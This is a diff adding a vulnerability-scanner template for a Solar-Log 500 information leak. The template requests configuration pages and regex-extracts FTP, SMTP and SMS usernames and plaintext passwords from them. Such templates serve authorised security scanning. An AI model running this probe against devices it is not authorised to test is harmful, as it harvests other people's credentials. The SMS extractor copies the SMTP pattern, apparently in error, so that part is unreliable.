@@ -1,0 +1,53 @@
+id: solar-log-infoleak
+
+info:
+  name: Solar-Log Incorrect Access Control Infoleak
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    An issue was discovered in Solar-Log 500 prior to 2.8.2 Build 52 - 23.04.2013. For example, in /export.html, email.html, sms.html, backup.html, the devices store plaintext passwords, which may allow sensitive information to be read by someone with access to the device.
+  tags: infoleak
+
+variables:
+  paths:
+    - "/backup.html"
+    - "/email.html"
+    - "/sms.html"
+
+http:
+  - raw:
+      - |
+        GET {{BaseURL}}{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "var AnlagenKWP="
+          - "var Boot="
+
+    extractors:
+      - type: regex
+        name: ftp_credentials
+        part: body
+        internal: true
+        regex:
+          - "id=\"ftp\".*?value=\"(.*?)\".*?id=\"user\".*?value=\"(.*?)\".*?id=\"password\".*?value=\"(.*?)\".*?id=\"dir\".*?value=\"(.*?)\""
+      - type: regex
+        name: smtp_credentials
+        part: body
+        internal: true
+        regex:
+          - "id=\"smtp\".*?value=\"(.*?)\".*?id=\"user\".*?value=\"(.*?)\".*?id=\"password\".*?value=\"(.*?)\".*?id=\"email_von\".*?value=\"(.*?)\".*?id=\"email_nach\".*?value=\"(.*?)\""
+      - type: regex
+        name: sms_credentials
+        part: body
+        internal: true
+        regex:
+          - "id=\"smtp\".*?value=\"(.*?)\".*?id=\"user\".*?value=\"(.*?)\".*?id=\"password\".*?value=\"(.*?)\""
